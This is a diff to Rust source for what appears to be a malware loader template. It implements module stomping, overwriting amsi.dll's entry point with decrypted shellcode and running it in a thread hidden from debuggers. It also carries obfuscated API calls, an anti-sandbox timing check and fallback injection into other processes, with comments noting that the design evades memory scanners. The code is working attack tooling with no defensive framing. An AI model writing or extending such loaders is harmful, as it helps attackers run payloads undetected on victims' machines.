@@ -24,10 +24,12 @@ use std::time::Instant;
 // Hide the created thread from debuggers, matching the ntCRT/ntAPC convention.
 const HIDE_FROM_DEBUGGER: u32 = 0x4;
 
-// Minimal in-memory PE header layout used to locate a loaded module's entry
-// point. Module stomping overwrites a legitimate DLL's .text with shellcode,
-// then branches into its entry point — the region is already RX-backed by a
-// file-mapped image, so no MEM_PRIVATE RWX allocation is ever created.
+// In-memory PE header layout used to locate a loaded module's entry point.
+//
+// Module stomping loads a legitimate DLL, then overwrites the bytes at its
+// AddressOfEntryPoint with shellcode. The thread is then created on that very
+// entry point, so the first instruction the thread runs is the start of the
+// shellcode. The page stays file-backed (image), not MEM_PRIVATE RWX.
 #[repr(C)]
 struct DosHeader {
     e_magic: u16,
@@ -35,14 +37,17 @@ struct DosHeader {
     e_lfanew: i32,
 }
 
+// IMAGE_FILE_HEADER is exactly 20 bytes. We lay it out field by field so the
+// SizeOfOptionalHeader field lands at the correct offset (16).
 #[repr(C)]
-struct PeHeader {
-    signature: u32,
+struct FileHeader {
     machine: u16,
     number_of_sections: u16,
-    _rest: [u8; 16],
+    _time_date_stamp: u32,
+    _pointer_to_symbol_table: u32,
+    _number_of_symbols: u32,
     size_of_optional_header: u16,
-    characteristics: u16,
+    _characteristics: u16,
 }
 
 #[repr(C)]
@@ -99,50 +104,35 @@ fn check_environment() -> bool {
     start.elapsed().as_millis() >= 2500
 }
 
-// Resolve the entry point of a loaded module by walking its in-memory PE
-// headers. Returns (entry_point_va, text_section_va, text_section_size).
-unsafe fn resolve_text_region(base: usize) -> Option<(*mut c_void, *mut c_void, usize)> {
+// Resolve the entry point VA of a loaded module by walking its in-memory PE
+// headers. The entry point is the address we stomp and the address the
+// created thread will start executing, so the shellcode's first byte is the
+// thread's first instruction.
+unsafe fn resolve_entry_point(base: usize) -> Option<*mut c_void> {
     let dos = &*(base as *const DosHeader);
     if dos.e_magic != 0x5A4D {
         return None;
     }
-    let nt = &*((base + dos.e_lfanew as usize) as *const PeHeader);
-    if nt.signature != 0x00004550 {
+    let nt_off = base + dos.e_lfanew as usize;
+
+    // NT signature ("PE\0\0") at the start of IMAGE_NT_HEADERS.
+    let signature = *(nt_off as *const u32);
+    if signature != 0x00004550 {
         return None;
     }
-    let opt = &*((base + dos.e_lfanew as usize + std::mem::size_of::<PeHeader>()) as *const OptionalHeader);
+
+    // IMAGE_FILE_HEADER immediately follows the 4-byte signature.
+    let file_off = nt_off + 4;
+    let file = &*(file_off as *const FileHeader);
+
+    // IMAGE_OPTIONAL_HEADER follows IMAGE_FILE_HEADER.
+    let opt_off = file_off + std::mem::size_of::<FileHeader>();
+    let opt = &*(opt_off as *const OptionalHeader);
     if opt.magic != 0x20B {
         return None;
     }
-    let entry_va = (base + opt.address_of_entry_point as usize) as *mut c_void;
 
-    // Section headers follow the optional header.
-    let sec_off = base + dos.e_lfanew as usize
-        + std::mem::size_of::<PeHeader>()
-        + nt.size_of_optional_header as usize;
-    #[repr(C)]
-    struct SectionHeader {
-        name: [u8; 8],
-        virtual_size: u32,
-        virtual_address: u32,
-        _rest: [u8; 24],
-    }
-    for i in 0..nt.number_of_sections as usize {
-        let sec = &*((sec_off + i * std::mem::size_of::<SectionHeader>()) as *const SectionHeader);
-        // Match the first executable-looking section (.text) by name.
-        if &sec.name[0..5] == b".text" {
-            let va = (base + sec.virtual_address as usize) as *mut c_void;
-            return Some((entry_va, va, sec.virtual_size as usize));
-        }
-    }
-    // Fallback: stomp the entry-point page if no .text section matched.
-    Some((entry_va, entry_va, buf_len_stub()))
-}
-
-// Fallback region size when a section cannot be resolved: stomp at least the
-// whole shellcode. Resolved at runtime via the caller's buffer length.
-fn buf_len_stub() -> usize {
-    0x1000
+    Some((base + opt.address_of_entry_point as usize) as *mut c_void)
 }
 
 // Find PIDs whose process name matches `tar`.
@@ -159,42 +149,50 @@ fn boxboxbox(tar: &str) -> Vec<usize> {
     dom
 }
 
-// Load a benign sacrificial DLL into THIS process, then overwrite its .text
-// with shellcode and return the stomped entry point.
+// Load a benign sacrificial DLL into THIS process, then overwrite its entry
+// point with shellcode and return the stomped entry point VA. The thread is
+// then created on that exact address so the shellcode runs from byte 0.
 unsafe fn stomp_local(buf: &mut Vec<u8>) -> Option<*mut c_void> {
-    // amsi.dll is a small, always-available system DLL whose .text is large
-    // enough for typical shellcode and looks benign to memory scanners.
+    // amsi.dll is a small, always-available system DLL whose entry point is
+    // large enough for typical shellcode and looks benign to scanners.
     let dll = CString::new(lc!("amsi.dll")).unwrap();
     let module = LoadLibraryA(dll.as_ptr());
     if module.is_null() {
         return None;
     }
     let base = module as usize;
-    let (entry_va, text_va, region_size) = resolve_text_region(base)?;
+    let entry_va = resolve_entry_point(base)?;
 
-    // Flip the .text region RW so we can overwrite it, then write the shellcode
-    // and restore RX. The page stays file-backed (image), not MEM_PRIVATE.
-    let mut old_protect: u32 = 0;
-    let mut region_base = text_va;
-    let mut region = std::cmp::max(region_size, buf.len());
-    let f_protect: FD = std::mem::transmute(g(OBF_D));
     let current_process: HANDLE = -1isize as HANDLE;
-    if !NT_SUCCESS(f_protect(current_process, &mut region_base, &mut region, PAGE_READWRITE, &mut old_protect)) {
+    let buf_len = buf.len();
+
+    // The entry point sits inside a page that is RX (image). Flip it RW so we
+    // can overwrite it, write the shellcode at the entry point, then restore
+    // RX. The region stays file-backed (image), not MEM_PRIVATE RWX.
+    let f_protect: FD = std::mem::transmute(g(OBF_D));
+    let mut region_base = entry_va;
+    let mut region_size = buf_len;
+    let mut old_protect: u32 = 0;
+    if !NT_SUCCESS(f_protect(current_process, &mut region_base, &mut region_size, PAGE_READWRITE, &mut old_protect)) {
         return None;
     }
 
     let f_write: FC = std::mem::transmute(g(OBF_C));
     let mut written: usize = 0;
-    let buf_len = buf.len();
-    let s = f_write(current_process, text_va, buf.as_ptr() as *mut c_void, buf_len, &mut written);
+    let s = f_write(current_process, entry_va, buf.as_ptr() as *mut c_void, buf_len, &mut written);
     if !NT_SUCCESS(s) || written != buf_len {
+        // Restore the original protection before bailing out.
+        let mut restore_base = entry_va;
+        let mut restore_size = buf_len;
+        let mut restore_old: u32 = 0;
+        f_protect(current_process, &mut restore_base, &mut restore_size, PAGE_EXECUTE_READ, &mut restore_old);
         return None;
     }
     common::wipe(buf);
 
     // Restore RX so the stomped region executes as a normal image section.
-    let mut restore_base = text_va;
-    let mut restore_size = region;
+    let mut restore_base = entry_va;
+    let mut restore_size = buf_len;
     let mut restore_old: u32 = 0;
     f_protect(current_process, &mut restore_base, &mut restore_size, PAGE_EXECUTE_READ, &mut restore_old);
 
@@ -222,10 +220,9 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         }
         pause(150);
 
-        // Remote module stomping: allocate RW in the target, write the
-        // shellcode, then flip RX and create a thread on it. This keeps the
-        // classic ntCRT flow but the region can be stomped over a legit
-        // module's mapped section by the operator if desired.
+        // Fallback remote injection (classic ntCRT flow) if local stomping
+        // failed. Allocate RW in the target, write the shellcode, flip RX and
+        // create a thread on it.
         let mut base: *mut c_void = null_mut();
         let mut size: usize = buf.len();
         let s = f_alloc(process_handle, &mut base, 0, &mut size, MEM_COMMIT, PAGE_READWRITE);
@@ -266,8 +263,8 @@ fn main() {
     let mut vec: Vec<u8> = buf.to_vec();
     {{MAIN}}
 
-    // Local module stomping: load amsi.dll, overwrite its .text with the
-    // decrypted shellcode, then branch into the stomped entry point via a
+    // Local module stomping: load amsi.dll, overwrite its entry point with
+    // the decrypted shellcode, then branch into the stomped entry point via a
     // thread created with HIDE_FROM_DEBUGGER.
     unsafe {
         if let Some(entry_va) = stomp_local(&mut vec) {
@@ -275,6 +272,12 @@ fn main() {
             let mut th: HANDLE = null_mut();
             let current_process: HANDLE = -1isize as HANDLE;
             f_thread(&mut th, THREAD_ALL_ACCESS, null_mut(), current_process, entry_va, null_mut(), HIDE_FROM_DEBUGGER, 0, 0, 0, null_mut());
+
+            // Keep the loader alive while the shellcode thread runs, matching
+            // the ntAPC self-injection behaviour.
+            if !th.is_null() {
+                pause(60_000);
+            }
             return;
         }
     }
@@ -286,6 +289,7 @@ fn main() {
         for i in &list {
             enhance(vec.clone(), *i);
         }
+        pause(60_000);
     }
 }
 {{DLL_MAIN}}
